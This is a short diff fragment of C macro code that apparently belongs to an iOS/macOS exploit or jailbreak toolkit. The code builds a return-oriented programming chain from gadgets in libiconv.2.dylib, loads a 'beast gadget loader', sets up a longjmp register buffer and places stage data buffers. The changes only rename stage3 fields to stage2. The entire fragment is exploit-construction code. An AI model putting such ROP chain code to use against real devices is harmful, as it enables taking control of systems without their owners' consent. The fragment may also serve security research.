@@ -201,7 +201,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	curr_gadget->next = NULL; \
 	curr_gadget->type = NONE; \
 	curr_gadget->comment = NULL; \
-	(offsets)->stage3_ropchain = curr_gadget; \
+	(offsets)->stage2_ropchain = curr_gadget; \
 	rop_var_t * curr_rop_var = NULL; \
 	rop_var_t * new_rop_var = malloc(sizeof(rop_var_t)); \
 	rop_var_t * rop_var_top = new_rop_var; \
@@ -218,7 +218,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */\
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); /* x30 */ \
 	ADD_GADGET(); /* x29 */ \
-	ADD_STATIC_GADGET(((offsets)->stage3_base+(offsets)->stage3_databuffer_len)); /* x2 */ \
+	ADD_STATIC_GADGET(((offsets)->stage2_base+(offsets)->stage2_databuffer_len)); /* x2 */ \
 	ADD_GADGET(); /* D8 */\
 	ADD_GADGET(); /* D9 */\
 	ADD_GADGET(); /* D10 */\
@@ -227,7 +227,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* D13 */\
 	ADD_GADGET(); /* D14 */\
 	ADD_GADGET(); /* D15 */\
-	ADD_BUFFER((offsets)->stage3_databuffer,((offsets)->stage3_databuffer_len-22*8)); /* encount for this longjmp buffer here */ \
+	ADD_BUFFER((offsets)->stage2_databuffer,((offsets)->stage2_databuffer_len-22*8)); /* encount for this longjmp buffer here */ \
 	SETUP_IF_X0();
 	
 // assuming we get here with pc pointing to the loader part of our beast gadget
